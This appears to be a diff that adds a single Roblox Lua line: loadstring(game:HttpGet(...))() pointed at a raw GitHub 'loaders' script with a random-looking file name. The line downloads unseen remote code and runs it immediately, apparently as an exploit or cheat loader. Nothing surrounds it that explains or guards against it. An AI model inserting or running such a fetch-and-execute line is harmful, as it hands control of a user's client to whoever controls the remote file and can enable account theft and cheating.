@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/helmets-scooter-empire-spam6-j85xonmjjr5ymj.lua"))()
